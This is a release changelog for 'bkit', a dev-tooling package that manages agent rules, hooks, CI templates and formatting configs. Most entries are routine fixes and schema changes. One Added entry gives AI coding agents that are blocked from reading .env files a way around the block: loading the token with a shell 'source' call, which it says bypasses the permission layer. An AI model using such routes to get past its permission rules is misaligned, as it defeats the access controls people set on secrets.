- **`.lintstagedrc.json` seed** — `bkit install` writes the lint-staged config (`"*": "prettier --write --ignore-unknown"`) as Tier-3 (seed-or-print) and adds `lint-staged` to consumer devDependencies so the new pre-commit call resolves without manual setup.

### Changed

- **`.prettierignore` bkit-managed block** narrowed — removed `.agents/prompts.md`, `.agents/workflows.md`, `.agents/IDEs.md`, and `docs/` from the canonical-overwrite ignore set so Prettier formats them in consumer repos. The affected paths are width-invariant under Prettier's default `proseWrap: "preserve"`: only one inline JSON example and one Markdown table in `workflows.md` were genuinely width-sensitive — both now wrapped with `<!-- prettier-ignore -->` (BAR-165 root-cause fix superseding the v1.1.1 ignore-list workaround). `templates.test.ts` BAR-165 invariant loop removed — no longer load-bearing.

### Fixed

- **`.npmrc` advisory copy: revert to plain `${GH_BKIT_TOKEN}` (reverses BAR-142 §B6).** The 2026-05-06 ship prescribed `_authToken=${GH_BKIT_TOKEN:-}` on the assumption pnpm parsed POSIX-style fallback. It does not: pnpm's npmrc env-var substitution only supports the simple `${VAR}` form and treats `GH_BKIT_TOKEN:-` as a literal var name, sending no auth header and producing an opaque 401 from the GH Packages registry — strictly worse than the original silent-fallback behaviour. Compounded by the fact that bkit's own `detectNpmrcAuth` validator (`bkit-postinstall.ts:45`) matches the plain form, so consumers who followed the buggy advisory failed bkit's own `npmrc-missing-gh-packages` check. Fixed the two advisory strings in `bkit-modules.ts` (first-install banner + CI guidance block) and the `gh-bkit-token-missing-shell` empty-token detect text. Flipped the enforcement test in `bkit-preflight.test.ts` to assert the plain form and explicitly forbid the broken `${VAR:-}` form across all script files.
- **Phantom `.prettierignore` "block broadened" advisory.** `BKIT_PRETTIERIGNORE_PATHS` in `bkit-preflight.ts` had drifted from the actual template at `.agents/templates/.prettierignore` — it listed `.agents/` and `docs/` (no longer in the template) and was missing `.claude/` and `.cursor/`. Every install on a consumer whose block contained `.agents/skills/` falsely fired "block is being broadened on this install: .agents/skills/ → .agents/" even though the install wrote `.agents/skills/` straight back. The constant now mirrors the template exactly; regression test added.

### Added

- **AGENT NOTE on token-missing advisories** — appended `AGENT_INLINE_SOURCE_GUIDANCE` to both `gh-bkit-token-missing-shell` advisories (missing + empty) explaining the `set -a; source <env-file>; set +a; <cmd>` single-Bash-call pattern. AI coding agents whose permission rules block `Read`/`grep` on `.env*` can still load `GH_BKIT_TOKEN` into a single command's environment without the token text entering their context, since `source` is a shell builtin and bypasses the permission layer that gates file I/O.

---

## [2.0.2] — 2026-05-11

### Added

- **Claude Cowork Dispatch support** — `BKIT_PREFLIGHT_BYPASS=dispatch` env var skips the Linear `Auto`/state guards so phone-triggered sessions without a Linear issue context can run. Destruction guards remain in force. (BAR-186)
- **`docs/dispatch.md`** documents Dispatch surfaces (Cowork bash sandbox vs computer-use), venv reproducibility (`uv` preferred, never commit `.venv/`), `direnv`/`mise` auto-activation requirement for tier-`click` terminals, keep-awake, and preflight interaction. Registered under a new "Operations" section in `.agents/docs.md` catalog + Workflow Matrix. (BAR-186)
- **`.agents/rules.md` Dispatch & Remote Sessions subsection** (canonical + template). (BAR-186)
- **Manual-seed templates** at `.agents/templates/.envrc.example` and `.agents/templates/.nvmrc` — copy into consumer repos when enabling Dispatch (NOT auto-installed; would otherwise overwrite consumer Node pins). Setup checklist in `docs/setup.md`. (BAR-186)
- **Preflight test coverage** — 7 new tests in `.agents/scripts/bkit-preflight.test.ts` covering Darwin gate, bypass position, additionalContext text, and 4 subprocess scenarios. (BAR-186)

### Fixed

- **Brew-bin preflight check is now Darwin-gated.** Previously `gh jq vale pnpm bun` were checked unconditionally and would hard-stop any Linux session (Cowork sandbox, CI, dev containers). (BAR-186)
- **Linear label rename `Automated` → `Auto`** propagated through preflight hooks (Claude + Cursor), rules, README, and Dispatch docs. **Breaking for Linear consumers — migration required:** the preflight automation gate now checks for an `Auto` label, so a workspace still using `Automated` will have approved issues refused at session start (`Auto label missing`). Before upgrading, rename your Linear `Automated` label to `Auto` (or add an `Auto` label and apply it to issues approved for automation). Sessions launched with `BKIT_PREFLIGHT_BYPASS=dispatch` skip the label gate entirely. (BAR-186)

---

## [2.0.1] — 2026-05-11

### Fixed

- **Re-publish patch:** bumps version to avoid E409 conflict from 2.0.0 GitHub Packages publish attempt. No code changes from 2.0.0. (BAR-167)

---

## [2.0.0] — 2026-05-11

### Removed (breaking)

- **`__bkit__` JSON envelope removed** from `.claude/settings.json` and `.cursor/hooks.json` templates. Reverses DE-7 and DE-8. Consumers upgrading from v0.8.0–v1.1.1 will have the `__bkit__` block stripped automatically on first `bkit upgrade`. Consumer-added keys outside the template tree survive byte-identical. (BAR-167)
- **Public API deletions from `bkit-tiers.ts`:** `applyBkitNamespace`, `extractBkitNamespace`, `migrateTier1JsonToTier2`, envelope-guard `throw` branch of `writeTier2Json`. (BAR-167)
- **`writeTier2Json` renamed to `writeTier2JsonContained`** — callers in `bkit-modules.ts` updated. (BAR-167)
- **`bkit-tier1-defaults.ts` deleted** — sole consumer was `migrateTier1JsonToTier2`. (BAR-167)

### Changed

- **Added `bkit:start..bkit:end` markers to 12 Group A templates:** `AGENTS.md`, `CLAUDE.md`, `.cursor/rules/00-shared-rules.mdc`, `.vale/styles/House/Filler.yml`, `.vale/styles/House/Hedging.yml`, `.vale/styles/House/LLMSlop.yml`, `.vale/styles/House/Verbose.yml`, `.agents/rules.md`, `.agents/docs.md`, `.agents/friction.md`, `.agents/skills.md`, `docs/plans/template.md`. (BAR-167)
- **Added partial-ownership `bkit:start..bkit:end` markers to 3 Group B templates:** `.github/workflows/ci.yml`, `.vale.ini`, `.husky/pre-push`. (BAR-167)
- **New `lint:no-tier-terms` script** enforces no `Tier [1-3]` terminology in docs. (BAR-167)
- **Simplified `bkit-manifest.ts` schema:** `tier` integer removed; `format` field added (`json | markered-text | byte-equal-text`). (BAR-167)
- **New advisory `tier2-text-drift`** emitted by `bkit check` when markered-text file content drifts from template block. (BAR-167)

### Changed (breaking)

- **`.cursor/hooks.json` template migrated to Cursor v1 keyed-object schema.** Old shape: `{"hooks": [{event, command}]}`. New shape: `{"version": 1, "hooks": {"sessionStart": [...], "sessionStop": [...]}}`. Existing consumers are migrated automatically on `bkit upgrade`. (BAR-167)
- **Ownership model for Tier-2 JSON is now deep-containment.** The template JSON tree is the declared bkit scope; `deepContains(template, consumer)` verifies every leaf is present. `writeTier2JsonContained` replaces the envelope-guard write path. No `__bkit__` key is written or expected. (BAR-167)

### Added

- **`deepContains(template, consumer, pathPrefix?)` primitive** — recursive walk; returns `{ ok, missing, mismatched }`. Supports object containment, array-of-primitive subset, array-of-object element-wise order-insensitive containment, null-input boundary cases. (BAR-167)
- **`migrateLegacyBkitEnvelope(doc, template)` helper** — pure function, no file I/O. Strips `__bkit__`, runs `deepContains`, deep-merges if containment fails. Returns `{ stripped, deepMerged, schemaFlipped, outDoc }`. Idempotent. (BAR-167)
- **`stripTier2JsonScope(consumerDoc, templateDoc)` helper** — for `bkit uninstall`: removes template scope, preserves consumer-only siblings, prunes empty intermediates only where template populated them. (BAR-167)
- **`bkit-paths.ts`** — new module exporting `getPkgRoot()`. Breaks `bkit-preflight ↔ bkit-modules` circular import. (BAR-167)
- **Preflight advisories:** `legacy-bkit-envelope-detected` (advisory, fires when `__bkit__` present), `tier2-json-drift` (advisory, fires when `deepContains` fails for `.cursor/hooks.json` or `.claude/settings.json`). (BAR-167)
- **Preflight blocker:** `pre-envelope-bkit-version-detected` (fires when `pinnedVersion < 0.8.0` AND no `__bkit__` — consumer must route through v1.x first). (BAR-167)
- **`workflow_dispatch:` trigger added** to `.github/workflows/ci.yml` and the consumer `ci.yml` template. Allows manual CI runs on feat branches without an open PR (`gh workflow run ci.yml --ref feat/{FID}`). (BAR-167)

### Migration

- Run `pnpm bkit upgrade` after bumping to v2.0.0. `migrateLegacyBkitEnvelope` strips the `__bkit__` block from `.claude/settings.json` and `.cursor/hooks.json` and logs `[bkit] migrated <file> — stripped __bkit__ envelope (v2.0.0)`. Run `pnpm bkit check` to verify zero drift.

---

## [1.1.2] — 2026-05-11

### Fixed

- **Pre-worktree `git add` in `bkit-design` and `bkit-plan` no longer absorbs unrelated in-flight edits into the workflow's commit.** Step 1 (start-workflow) and Step 2's pre-worktree-uncommitted guard execute on the originating branch (often `dev`) before `cd "$WORKTREE_PATH"`. The prior `git add -A` (design Step 1) and broad deny-list (both Step 2 guards) swept the user's working-tree state into the workflow's commit, which then rode `feat/{FID}` → `dev` on close-workflow merge. Both pre-worktree stages now allow-list `docs/plans/ .agents/friction.md` only, with `git diff --cached --quiet ||` guarding the commit so no empty commit fires when those paths weren't touched. `git worktree add` does not inherit dirty state, so leaving other edits on `dev`'s working dir is correct, not a hazard. Post-worktree (Step 3+) `git add -A` is unchanged — cwd is the workflow sandbox. Rationale documented in `.agents/workflows.md` § Common Workflow Anatomy. `bkit-build` / `bkit-debug` / `bkit-ship` still carry the same pattern and are deferred to a follow-up.

---

## [1.1.1] — 2026-05-09

### Fixed

- **Canonical-overwrite content (`.agents/prompts.md`, `.agents/workflows.md`, `.agents/IDEs.md`) added to bkit-managed block of `.agents/templates/.prettierignore`.** These files are force-overwritten by `bkit install` (`CANONICAL_OVERWRITE_RELPATHS` in `bkit-modules.ts`), and v1.1.0 added `pnpm format:check` to the pre-push hook template. A consumer whose prettier config resolved to a narrower `printWidth` than bkit's 100 (e.g. prettier defaults at 80) saw `format:check` fail on width-sensitive lines in the canonical content, with no consumer-side fix that survived the next install. Now consumer prettier no longer lints bkit-owned content — same precedent as the existing `.agents/skills/` exclusion. Test guard: `templates.test.ts` asserts every path in `CANONICAL_OVERWRITE_RELPATHS` is listed inside the bkit-managed block. (BAR-165)

---

## [1.1.0] — 2026-05-09

### Removed (breaking, but no consumer was usefully relying on it)

- **`setup-auth@v1` composite GitHub Action** (`.github/actions/setup-auth/`) and its meta-test workflow (`.github/workflows/test-action.yml`). The composite was unreachable from any consumer outside the `cbartens/` GitHub namespace while `bkit` stayed private — the runner's `GITHUB_TOKEN` cannot resolve cross-org private `uses:` references at action-resolution time, so `cbartens/bkit/.github/actions/setup-auth@<ref>` failed with "repository not found" before the install step ran. Both real consumers are on the env-var pattern and unaffected. (BAR-164)

### Changed

- **Canonical `ci.yml` template now uses the env-var pattern only.** `.agents/templates/.github/workflows/ci.yml` no longer references the deleted composite. The install step continues to receive `GH_BKIT_TOKEN` as env — the consumer's `.npmrc` (`//npm.pkg.github.com/:_authToken=${GH_BKIT_TOKEN}`) authenticates the registry directly. New consumers seeded after this release get the working template. (BAR-164)
- **README "Adding a new consumer — checklist"** added at the top of §Install — threads the existing §"Consumer CI auth" + §"Consumer Vercel auth" sections into a 7-step trail (PAT → secret → `.npmrc` → install → bkit install → Vercel → push). The §"Helper action: `setup-auth@v1`" and §"Consumer migration — pin to sliding `@v1`" sections were removed (composite no longer ships). (BAR-164)
- **`docs/deployments.md` § "`setup-auth@v1` composite GitHub Action"** removed; replaced by § "Consumer CI auth — env-var pattern (canonical)". § "Sliding major-version tag" retained — internal release-pipeline mechanics, orthogonal to the composite. (BAR-164)

### Added

- **Installer guard `scanForeignBkitUses`** (`bkit-modules.ts`). `runCiModule` now scans the canonical CI template for `uses: cbartens/bkit/...@<ref>` references before writing and throws if any are present. Catches BAR-164-class regressions at dev/CI time so a broken template can never reach a consumer repo. (BAR-164 AC #6)

### Notes

- Sliding `v1` git tag and the `release.yml` job that maintains it are kept untouched. Consumers transitioning to in-namespace tooling will pin to it later.

---

## [1.0.2] — 2026-05-08

### Fixed

- **Prevent bkit dogfood content from leaking into consumer `.agents/` on install.** `runCoreTemplates` now processes `.agents/` subtemplates from `templates/.agents/` (managed block sourced from the template), and `copyAdditive` excludes the Tier-2-style basenames (`rules.md`, `friction.md`, `docs.md`, `skills.md`) so it no longer additively copies bkit's own out-of-block content (e.g. `### bkit Repo Authoring`, bkit's `## Project Rules` body, friction-log entries) onto consumers. Added `bkit-modules.integration.test.ts` to lock the boundary. (commit `f6be98b`)

### Changed

- **`README.md` / `.agents/README.md` install docs.** Added explicit `GH_BKIT_TOKEN` export guidance for environments with restricted `.env*` access; clarified consumer-facing install flow. Trimmed redundant pre-push checklist from `.agents/rules.md`. (commit `f6be98b`)

---

## [1.0.1] — 2026-05-08

### Fixed

- **`bkit upgrade` no longer silently overwrites files lacking a recorded canonical hash.** Previously `isConsumerModified` returned `false` for unknown-hash files, which the upgrade engine treated as "no drift detected → safe to overwrite". Pre-v0.9.x installs (where `canonicalHashes` did not exist) and any managed file not re-written by `bkit install` since BAR-142 landed had no hash recorded — a single `bkit upgrade` could destroy consumer content. Default flipped: missing hash now returns `true` (treat as modified, surface a conflict, require explicit consumer resolution). `diffFile`'s idempotent `disk == template → skip` check moved earlier so identical files still skip cleanly. (DE-12, commit `954e827`)
- **`.claude/settings.json` template now matches consumer mirror for `apps/*/.env` and `packages/*/.env` reads.** Original deny→ask move (commit `1ecd15d`) only edited the consumer mirror; the canonical template still listed those reads under `deny`, so the next `bkit install` mirror-regen reverted the move. Now editing both in lockstep. (commit `8db6636`)

### Added

- **Auto-seed `canonicalHashes` for skipped files on `bkit upgrade`.** `updateCanonicalHashesAfterUpgrade` now records canonical hashes for files where `disk == template` (the upgrade engine's `skip` classification), in addition to the existing `update` path. Conflict files are explicitly NOT seeded — that would re-introduce the silent-overwrite bug. Effect: running `bkit upgrade` once after this release auto-heals the missing-hash gap for any consumer installed before BAR-142. Truly-customised files continue to surface as conflicts requiring manual resolution. (DE-13, commit `e2889e1`)

### Notes

- Pre-v0.9.x consumers will see all-conflict on first `bkit upgrade` after this release. This is the safe failure mode — review each conflict, accept or reject, and the auto-seed populates canonical hashes for any files where you accept the bkit template. Subsequent upgrades will only flag genuine drift.

---

## [1.0.0] — 2026-05-07

### Added

- **`setup-auth@v1` composite action** — GitHub Actions composite action at `.github/actions/setup-auth/action.yml` wraps the multi-line bash PAT-shim. Consumers reference `uses: cbartens/bkit/.github/actions/setup-auth@v1`. Requires `v1` annotated tag (pushed post-merge). Inputs: `token` (required, `GH_BKIT_TOKEN` PAT), `registry` (optional, defaults to `https://npm.pkg.github.com`). Exports `BKIT_READ_TOKEN` into the job env. (BAR-131 §1)
- **`v1` annotated tag** — pushed post-merge, pointing to the sub-plan-4 squash-merge commit. Required for `uses: cbartens/bkit/.github/actions/setup-auth@v1` to resolve in consumers.

### Notes

- Multi-line bash PAT-shim block in seeded `ci.yml` is **retained** (RETAIN-WITH-REASON: external contract — non-Actions CI fallback). Kill-date: v1.1.0.
- `.github/workflows/test-action.yml` meta-test workflow added for manual `workflow_dispatch` smoke testing.
- Offline acceptance test `bkit-action-yaml.test.ts` parses `action.yml` without network calls.

---

## [0.9.0] — 2026-05-07

### Added

- **Transactional install** — `bkit install` now writes to `.bkit-staging/<module>/` per module before committing. On success, staged files are atomically renamed to consumer destinations. On failure, `discardAllStaging` removes all staging dirs — consumer files left byte-identical to pre-install state. (BAR-142 §A4)
- **`bkit upgrade` verb** — diff engine compares old vs new template content against consumer drift. Non-conflicting changes applied automatically; conflicting files (consumer-modified since install) emitted to stderr without overwrite. `--non-interactive` flag: auto-apply non-conflicting; exit non-zero on any conflict (CI-safe). (BAR-142 §A5)
- **`canonicalHashes` in `.bkit-version`** — additive field (v0.9.x+) records sha256 of every bkit-managed file at install time. Used by `bkit upgrade` drift detection. Backward-compat: absent field defaults to `{}` (all files appear "unknown" → conservative no-overwrite). (BAR-142 §A5)
- **`isConsumerModified` helper** — exported from `bkit-version.ts`; returns true when a managed file's on-disk hash differs from its recorded canonical hash (consumer drift). (BAR-142 §A5)

### Breaking Changes

None. All new surface is additive. `canonicalHashes` absent in old `.bkit-version` payloads defaults to `{}` — backward-compat read.

---

## [0.8.0] — 2026-05-07

### Added

- **`__bkit__` JSON namespace (public contract)** — `.claude/settings.json` and `.cursor/hooks.json` now carry a `__bkit__` top-level envelope containing bkit's managed payload. Consumer-added keys live outside the envelope and survive every `bkit install` upgrade byte-identically. This is a public contract: the key name is stable from v0.8.0 onward. (BAR-142 §A1)
- **Tier-2 JSON deep-merge** (`writeTier2Json`) — replaces the Tier-1 full-overwrite for ownership-mixed JSON files. bkit updates only `__bkit__`; consumer keys are never touched. Throws explicitly when template lacks `__bkit__` envelope (rollback safety). (BAR-142 §A1)
- **Tier-1 → Tier-2 auto-migration** (`migrateTier1JsonToTier2`) — consumers upgrading from v0.5.x–v0.7.x have their existing files automatically migrated on the first v0.8.0 install. Consumer-added keys (e.g. `hooks.Stop`, `failClosed`, `loop_limit`) are preserved outside `__bkit__`. Idempotent. (BAR-142 §A1)
- **Versioned-defaults SoT** (`bkit-tier1-defaults.ts`) — `BKIT_TIER1_DEFAULTS_BY_VERSION` snapshots bkit's shipped template shapes at v0.5.x–v0.7.x. Used by migration to identify bkit-owned vs consumer-added keys when upgrading from pre-`__bkit__` installs. (BAR-142 §A1)
- **B3 — Vercel CLI hang guard** — `detectVercelEnv` now pre-checks `.vercel/project.json` before shelling out to `vercel env ls`. If the project is not linked (file absent), the CLI call is skipped entirely — no TTY hang, no login prompt in non-interactive CI. (BAR-142 §B3)

### Breaking Changes

- **`.claude/settings.json` and `.cursor/hooks.json` reclassified Tier-1 → Tier-2.** Files written by prior bkit versions are auto-migrated to the `__bkit__` envelope form on the first v0.8.0 install. Consumers with custom hook entries no longer need to skip `--claude` / `--cursor` to prevent overwrite. The `detectHooksConfigOverwriteRisk` preflight blocker is removed (architecturally redundant). **Action required: run `pnpm bkit install` after upgrading to v0.8.0** to apply migration.

### Removed

- **`detectHooksConfigOverwriteRisk`** — preflight blocker (ids `hooks-config-overwrite-risk-claude`, `hooks-config-overwrite-risk-cursor`) removed. No longer needed: Tier-2 deep-merge guarantees consumer keys survive upgrades without a preflight gate. (BAR-142 §A1)

---

## [0.7.0] — 2026-05-07

### Added

- **`bkit uninstall` verb** — surgical removal of bkit-managed content. Tier-1 files deleted, Tier-2 managed-block stripped (consumer content preserved), Tier-3 files protected by sha256 hash guard (deleted only if content matches install-time hash). Module flags mirror install (`--ci`, `--lint`, `--git-hooks`, etc.). (BAR-139)
- **`--dry-run` for uninstall** — prints a `FILE | DECISION | REASON` table without writing. (BAR-139)
- **`--nuke` for uninstall** — deletes ALL bkit-managed files regardless of tier; requires `--yes` or interactive confirm. (BAR-139)
- **`--auto-revert` for install** — on Phase 3 blocker, automatically reverts via `bkit uninstall` in-process before exiting 1. (BAR-139 §7)
- **`process.exit(1)` on Phase 3 blockers** — `bkit install` now exits 1 when a `severity: "blocker"` finding is detected in Phase 3. Prints a single-line recovery command: `pnpm bkit uninstall <flags> && <fix> && pnpm bkit install <flags>`. Advisory findings remain informational only. (BAR-142 §A6)
- **`.bkitignore` parser** — create `.bkitignore` at repo root to suppress `bkit check` drift for specific files (picomatch globs) or JSON keys (`:dotted.key` syntax, opt-in via `BKIT_BKITIGNORE_PER_KEY=1`). Comments (`#`) and blank lines ignored. (BAR-142 §A2)
- **`.bkit-version` schema extension** — file format upgraded from plain-text semver to JSON `{ pinnedVersion, tier3Hashes }`. Backward-compatible: old plain-text format is auto-parsed. `tier3Hashes` records sha256 of Tier-3 files at install time for safe-delete decisions during uninstall. (BAR-139)
- **Per-module install manifest** (`bkit-manifest.ts`) — typed record of files each module writes with tier classifications; drives uninstall and `package.json` key stripping. (BAR-139)

### Breaking Changes

- `process.exit(1)` on Phase 3 blockers: **consumers gating CI on `bkit install` exit code may see new failures** if Phase 3 blocker conditions are present. Advisories continue to exit 0. See § Phase 3 exit-1 and recovery in README.

---

## [0.6.0] — 2026-05-07

### Added

- **`bkit doctor` verb** — read-only preflight + post-install advisory replay. Run `pnpm bkit doctor` to diagnose drift without writing. Exits 0. (BAR-142 §A3)
- **CHANGELOG.md** — this file; shipped in tarball and surfaced as a version-delta header in post-install. (BAR-142 §A7)

### Fixed

- **B1 — Anchored marker regex** — `hasBkitMarkers` now uses line-anchored detection (matching `findLineAnchoredMarkers`). Prose-fenced `` `<!-- bkit:start -->` `` inside markdown no longer falsely suppresses the `husky-no-markers` advisory. (BAR-142 §B1)
- **B2 — Position-stable cross-phase dedup** — `runPostInstallCheck` cross-phase dedup now preserves preflight advisory order (preflight first, Phase 3 at back), matching `formatChecklist` display order. (BAR-142 §B2)
- **B4 — `detectShellToken` empty vs unset** — Empty-string `GH_BKIT_TOKEN=""` is now treated as missing (was silently "present"). Action text differentiates the two cases. (BAR-142 §B4)
- **B5 — `LOG_PREFIX` on dry-run blocker banner** — The dry-run blockers banner now carries the `[bkit-check]` or `[bkit-install]` log prefix. (BAR-142 §B5)
- **B6 — `.npmrc` `${GH_BKIT_TOKEN:-}` fallback + concrete action text** — Inline `.npmrc` literal in `bkit-modules.ts` now uses the POSIX `${GH_BKIT_TOKEN:-}` fallback form so pnpm does not silently ignore the entire `.npmrc` when the token is unset. Action text for `gh-bkit-token-secret-unknown` instructs: `export GH_BKIT_TOKEN=$(gh auth token)`. (BAR-142 §B6)
